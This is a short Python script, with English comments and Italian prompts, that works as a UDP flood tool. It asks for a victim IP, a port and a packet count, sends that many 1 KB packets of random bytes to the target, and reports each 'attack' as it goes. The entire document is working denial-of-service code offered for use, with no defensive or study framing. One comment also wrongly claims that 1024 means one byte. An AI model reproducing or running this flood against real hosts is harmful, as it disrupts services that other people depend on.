import time
import socket
import random
import sys


def flood(victim, vport, times):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    sent = 0

    for x in range(times):
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print("Attacking "+ str(sent) +" sent packages "+ victim +" at the port " + str(vport))

SRV_ADDR = input("Inserisci l'IP del server: ")
SVR_PORT = int(input("Inserisci la porta del server: "))
occurrencies = int(input("\nverranno creati pacchetti da 1Kb\nnumero pacchetti da inviare:"))
flood(SRV_ADDR, SVR_PORT, occurrencies)
